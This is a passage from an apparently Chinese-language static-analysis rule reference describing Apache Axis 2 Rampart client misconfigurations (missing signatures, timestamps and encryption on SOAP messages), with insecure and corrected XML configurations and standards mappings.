<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;axisconfig name=&quot;AxisJava2.0&quot;&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">	&lt;parameter name=&quot;InflowSecurity&quot;&gt;</span><br><span class="line"></span><br><span class="line">		&lt;action&gt;</span><br><span class="line"></span><br><span class="line">			&lt;items&gt;Timestamp Encrypt&lt;/items&gt;</span><br><span class="line"></span><br><span class="line">			...</span><br><span class="line"></span><br><span class="line">		&lt;/action&gt;</span><br><span class="line"></span><br><span class="line">	&lt;/parameter&gt;</span><br><span class="line"></span><br><span class="line">&lt;/axisconfig&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-158"><a href="#RECOMMENDATIONS-158" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>将该客户端配置为对输入的响应验证签名。</p>
<p>下列客户端配置可让 Axis 2 验证它所收到的消息的签名：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;axisconfig name=&quot;AxisJava2.0&quot;&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">	&lt;parameter name=&quot;InflowSecurity&quot;&gt;</span><br><span class="line"></span><br><span class="line">		&lt;action&gt;</span><br><span class="line"></span><br><span class="line">			&lt;items&gt;Timestamp Signature Encrypt&lt;/items&gt;</span><br><span class="line"></span><br><span class="line">			...</span><br><span class="line"></span><br><span class="line">		&lt;/action&gt;</span><br><span class="line"></span><br><span class="line">	&lt;/parameter&gt;</span><br><span class="line"></span><br><span class="line">&lt;/axisconfig&gt;</span><br></pre></td></tr></table></figure>
<p>顺序非常重要！将 Signature 指令置于 Encrypt 指令之前以及 Timestamp 指令之后，可确保对时间戳进行签名以及对签名和时间戳进行加密。</p>
<h5 id="REFERENCES-157"><a href="#REFERENCES-157" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Securing SOAP Messages with Rampart Apache Software Foundation</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 345</p>
<p>[3] Standards Mapping - FIPS200 CM</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[7] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[8] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.4</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.4</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3260.1 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3860 CAT II, APP3260 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3860 CAT II, APP3260 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3860 CAT II, APP3260 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3860 CAT II, APP3260 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3860 CAT II, APP3260 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3860 CAT II, APP3260 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[23] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[24] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="Axis-2-Service-Requester-Misconfiguration-Missing-Inbound-Timestamp"><a href="#Axis-2-Service-Requester-Misconfiguration-Missing-Inbound-Timestamp" class="headerlink" title="Axis 2 Service Requester Misconfiguration: Missing Inbound Timestamp"></a>Axis 2 Service Requester Misconfiguration: Missing Inbound Timestamp</h4><h5 id="ABSTRACT-159"><a href="#ABSTRACT-159" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>若缺少时间戳，会导致 SOAP 消息遭受 replay 攻击。</p>
<h5 id="EXPLANATION-160"><a href="#EXPLANATION-160" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>安全性时间戳可表明消息的“新鲜性”。如果攻击者截取了一则消息，稍后将其转发，则接收者能够拒绝此 replay 攻击，因为时间戳会指明该消息已过期。时间戳可包含有效期属性，通过该属性，可对安全语义的有效期设置一个硬限制。</p>
<p>为避免攻击者篡改时间戳，应对时间戳执行签名。如果 SOAP 消息的时间戳未经签名，则攻击者可在接收者不知情的情况下截取该消息、修改时间戳，以及转发该消息。在这种情况下，攻击者可能会欺骗接收者接受恶意消息。</p>
<p>下列 Apache Axis 2 Rampart 配置的 <code>&lt;items&gt;</code>标签中缺少 Timestamp 指令，因此该客户端不会要求响应中包含时间戳。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;axisconfig name=&quot;AxisJava2.0&quot;&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">   &lt;parameter name=&quot;InflowSecurity&quot;&gt;</span><br><span class="line"></span><br><span class="line">      &lt;action&gt;</span><br><span class="line"></span><br><span class="line">        &lt;items&gt;Signature Encrypt&lt;/items&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;/axisconfig&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-159"><a href="#RECOMMENDATIONS-159" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>如果该服务提供支持，则将客户端配置为只接受带有时间戳的响应。 下列 Apache Axis 2 Rampart 配置的 <code>&lt;items&gt;</code>标签中包含 Timestamp 指令，因此它要求所有响应中都包含时间戳。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;axisconfig name=&quot;AxisJava2.0&quot;&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">   &lt;parameter name=&quot;InflowSecurity&quot;&gt;</span><br><span class="line"></span><br><span class="line">      &lt;action&gt;</span><br><span class="line"></span><br><span class="line">        &lt;items&gt;Timestamp Signature Encrypt&lt;/items&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;/axisconfig&gt;</span><br></pre></td></tr></table></figure>
<p>顺序非常重要！将 Timestamp 指令置于 Signature 指令和 Encrypt 指令之前，可确保对时间戳进行签名和加密。</p>
<h5 id="REFERENCES-158"><a href="#REFERENCES-158" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Securing SOAP Messages with Rampart Apache Software Foundation</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 254</p>
<p>[3] Standards Mapping - FIPS200 CM</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[7] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[8] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.4</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.4</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3260.1 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3870 CAT I, APP3260 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3870 CAT I, APP3260 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3870 CAT I, APP3260 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3870 CAT I, APP3260 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3870 CAT I, APP3260 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3870 CAT I, APP3260 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000180 CAT II, APSC-DV-000190 CAT I, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000180 CAT II, APSC-DV-000190 CAT I, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000180 CAT II, APSC-DV-000190 CAT I, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[23] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[24] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="Axis-2-Service-Requester-Misconfiguration-Missing-Outbound-Encryption"><a href="#Axis-2-Service-Requester-Misconfiguration-Missing-Outbound-Encryption" class="headerlink" title="Axis 2 Service Requester Misconfiguration: Missing Outbound Encryption"></a>Axis 2 Service Requester Misconfiguration: Missing Outbound Encryption</h4><h5 id="ABSTRACT-160"><a href="#ABSTRACT-160" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>未加密的消息无法保护其保密性。</p>
<h5 id="EXPLANATION-161"><a href="#EXPLANATION-161" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>SOAP 消息级加密可确保真正的端到端保密性。可通过多种传输协议发送 SOAP 消息，例如 HTTPS、HTTP、TCP、SMTP、UDP 等。无论采用哪种传输协议，消息级加密都可确保消息的保密性。Web 服务之间的常见传送情形是在各种服务之间转发 SOAP 消息，因此通过消息级加密，消息发送者和接收者均无需担忧中继点之间的传输安全问题。</p>
<p>下列 Apache Axis 2 Rampart 客户端配置不要求对输入的消息进行加密，因为 <code>&lt;items&gt;</code>标签不包含 Encrypt 指令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;service&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">	&lt;parameter name=&quot;OutflowSecurity&quot;&gt;</span><br><span class="line"></span><br><span class="line">		&lt;action&gt;</span><br><span class="line"></span><br><span class="line">			&lt;items&gt;Timestamp Signature&lt;/items&gt;</span><br><span class="line"></span><br><span class="line">			...</span><br><span class="line"></span><br><span class="line">		&lt;/action&gt;</span><br><span class="line"></span><br><span class="line">	&lt;/parameter&gt;</span><br><span class="line"></span><br><span class="line">&lt;/service&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-160"><a href="#RECOMMENDATIONS-160" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>如果服务提供程序提供支持，则将客户端配置为只发送加密的消息。在 <code>&lt;items&gt;</code> 标签中添加 Encrypt 指令，便可完成此配置。</p>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;service&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">	&lt;parameter name=&quot;OutflowSecurity&quot;&gt;</span><br><span class="line"></span><br><span class="line">		&lt;action&gt;</span><br><span class="line"></span><br><span class="line">			&lt;items&gt;Timestamp Signature Encrypt&lt;/items&gt;</span><br><span class="line"></span><br><span class="line">			...</span><br><span class="line"></span><br><span class="line">		&lt;/action&gt;</span><br><span class="line"></span><br><span class="line">	&lt;/parameter&gt;</span><br><span class="line"></span><br><span class="line">&lt;/service&gt;</span><br></pre></td></tr></table></figure>
<p>顺序非常重要！将 Encrypt 指令放在末尾，可确保其前面的任何内容都得到加密。在上例中，时间戳和签名都将被加密。</p>
<h5 id="REFERENCES-159"><a href="#REFERENCES-159" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Securing SOAP Messages with Rampart Apache Software Foundation</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 311</p>
<p>[3] Standards Mapping - FIPS200 CM</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A9 Insecure Communications</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A9 Insufficient Transport Layer Protection</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 4.1, Requirement 6.5.10</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.4</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.4</p>
<p>[16] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 319</p>
<p>[17] Standards Mapping - SANS Top 25 2010 Porous Defenses - CWE ID 311</p>
<p>[18] Standards Mapping - SANS Top 25 2011 Porous Defenses - CWE ID 311</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000260 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000260 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000260 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[29] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[30] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="Axis-2-Service-Requester-Misconfiguration-Missing-Outbound-Signature"><a href="#Axis-2-Service-Requester-Misconfiguration-Missing-Outbound-Signature" class="headerlink" title="Axis 2 Service Requester Misconfiguration: Missing Outbound Signature"></a>Axis 2 Service Requester Misconfiguration: Missing Outbound Signature</h4><h5 id="ABSTRACT-161"><a href="#ABSTRACT-161" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>缺少签名意味着无法保证 SOAP 消息的完整性。</p>
<h5 id="EXPLANATION-162"><a href="#EXPLANATION-162" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>消息中任何未经签名的部分，都可能在接收者未察觉的情况下被截取和修改。没有签名，接收者就无法借助密码验证消息内容的来源。</p>
<p>下列客户端配置可让 Axis 2 发送未经签名的请求：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;axisconfig name=&quot;AxisJava2.0&quot;&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">	&lt;parameter name=&quot;OutflowSecurity&quot;&gt;</span><br><span class="line"></span><br><span class="line">		&lt;action&gt;</span><br><span class="line"></span><br><span class="line">			&lt;items&gt;Timestamp Encrypt&lt;/items&gt;</span><br><span class="line"></span><br><span class="line">			...</span><br><span class="line"></span><br><span class="line">		&lt;/action&gt;</span><br><span class="line"></span><br><span class="line">	&lt;/parameter&gt;</span><br><span class="line"></span><br><span class="line">&lt;/axisconfig&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-161"><a href="#RECOMMENDATIONS-161" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>将客户端配置为对输出的请求进行签名，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;axisconfig name=&quot;AxisJava2.0&quot;&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">	&lt;parameter name=&quot;OutflowSecurity&quot;&gt;</span><br><span class="line"></span><br><span class="line">		&lt;action&gt;</span><br><span class="line"></span><br><span class="line">			&lt;items&gt;Timestamp Signature Encrypt&lt;/items&gt;</span><br><span class="line"></span><br><span class="line">			...</span><br><span class="line"></span><br><span class="line">		&lt;/action&gt;</span><br><span class="line"></span><br><span class="line">	&lt;/parameter&gt;</span><br><span class="line"></span><br><span class="line">&lt;/axisconfig&gt;</span><br></pre></td></tr></table></figure>
<p>顺序非常重要！将 Signature 指令置于 Encrypt 指令之前以及 Timestamp 指令之后，可确保对时间戳进行签名以及对签名和时间戳进行加密。</p>
<h5 id="REFERENCES-160"><a href="#REFERENCES-160" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Securing SOAP Messages with Rampart Apache Software Foundation</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 345</p>
<p>[3] Standards Mapping - FIPS200 CM</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[7] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[8] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.4</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.4</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3260.1 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3860 CAT II, APP3260 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3860 CAT II, APP3260 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3860 CAT II, APP3260 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3860 CAT II, APP3260 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3860 CAT II, APP3260 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3860 CAT II, APP3260 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[23] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[24] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="Axis-2-Service-Requester-Misconfiguration-Missing-Outbound-Timestamp"><a href="#Axis-2-Service-Requester-Misconfiguration-Missing-Outbound-Timestamp" class="headerlink" title="Axis 2 Service Requester Misconfiguration: Missing Outbound Timestamp"></a>Axis 2 Service Requester Misconfiguration: Missing Outbound Timestamp</h4><h5 id="ABSTRACT-162"><a href="#ABSTRACT-162" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>若缺少时间戳，会导致 SOAP 消息遭受 replay 攻击。</p>
<h5 id="EXPLANATION-163"><a href="#EXPLANATION-163" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>安全性时间戳可表明消息安全数据的“新鲜性”。如果攻击者截取了一则消息，稍后将其转发，则接收者能够拒绝此 replay 攻击，因为时间戳会指明该消息已过期。时间戳可包含有效期属性，通过该属性，可对安全语义的有效期设置一个硬限制。</p>
<p>为避免攻击者篡改时间戳，应对时间戳执行签名。如果 SOAP 消息的时间戳未经签名，则攻击者可在接收者不知情的情况下截取该消息、修改时间戳，以及转发该消息。在这种情况下，攻击者会欺骗接收者接受恶意消息。</p>
<p>下列 Apache Axis 2 Rampart 配置的 <code>&lt;items&gt;</code>标签中缺少 Timestamp 指令，因此该客户端不会发送带有时间戳的请求。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;axisconfig name=&quot;AxisJava2.0&quot;&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">   &lt;parameter name=&quot;OutflowSecurity&quot;&gt;</span><br><span class="line"></span><br><span class="line">      &lt;action&gt;</span><br><span class="line"></span><br><span class="line">        &lt;items&gt;Signature Encrypt&lt;/items&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;/axisconfig&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-162"><a href="#RECOMMENDATIONS-162" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>如果该服务提供支持，则将客户端配置为在输出的请求中发送时间戳。 下列 Apache Axis 2 Rampart 配置的 <code>&lt;items&gt;</code> 标签中包含 Timestamp 指令，因此它在输出的请求中包含时间戳。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;axisconfig name=&quot;AxisJava2.0&quot;&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">   &lt;parameter name=&quot;OutflowSecurity&quot;&gt;</span><br><span class="line"></span><br><span class="line">      &lt;action&gt;</span><br><span class="line"></span><br><span class="line">        &lt;items&gt;Timestamp Signature Encrypt&lt;/items&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;/axisconfig&gt;</span><br></pre></td></tr></table></figure>
